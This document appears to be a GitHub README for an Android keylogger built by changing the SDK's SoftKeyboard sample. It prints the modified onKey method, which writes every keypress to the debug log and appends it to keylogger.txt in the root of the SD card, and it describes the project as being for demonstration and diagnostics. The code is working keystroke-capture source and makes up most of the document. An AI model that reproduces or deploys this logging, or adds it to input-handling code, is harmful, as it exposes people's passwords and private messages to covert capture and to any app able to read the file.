#Android KeyLogger Keyboard

This is a simple modification to the SoftKeyboard sample that is included with the Android SDK. It adds a keylogger that writes output to the root directory of the SD Card (for easy access). This is provided for demonstration / diagnostic purposes only.

The only real change here is to the onKey method of the [SoftKeyboard class](https://github.com/tomgersic/AndroidKeyLogger/blob/master/src/com/example/android/softkeyboard/SoftKeyboard.java):

    public void onKey(int primaryCode, int[] keyCodes) {
    	String keypress = String.valueOf((char)primaryCode);
    	Log.d("Key Pressed",keypress);
    	try{
        	String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
        	String FILENAME = "keylogger.txt";

    		File outfile = new File(SDCARD+File.separator+FILENAME);
    		FileOutputStream fos = new FileOutputStream(outfile,true);
    		fos.write(keypress.getBytes());
    		fos.close();
    	}catch(Exception e) {
    		Log.d("EXCEPTION",e.getMessage());
    	}